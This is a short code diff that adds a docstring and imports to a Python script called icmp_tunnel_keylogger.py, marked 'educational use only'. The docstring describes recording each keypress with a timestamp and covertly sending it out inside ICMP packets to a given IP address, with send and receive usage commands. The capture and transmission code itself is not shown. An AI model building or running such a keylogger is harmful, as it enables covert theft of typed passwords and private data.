@@ -1,3 +1,17 @@
+'''
+icmp_tunnel_keylogger.py (educational use only)
+
+At source, embeds each keypress (and time-stamp) into payload of ICMP request packet sent to destination.
+At destination, unpacks and prints 'timestamp : keypress'
+
+send mode usage (at source):
+  python icmp_tunnel_keylogger.py send [ip address]
+  example:  python icmp_tunnel_keylogger.py send 192.168.0.3
+  
+receive mode usage (at destination):
+  python icmp_tunnel_keylogger.py recv
+'''
+
 import sys
 import keyboard
 from datetime import datetime
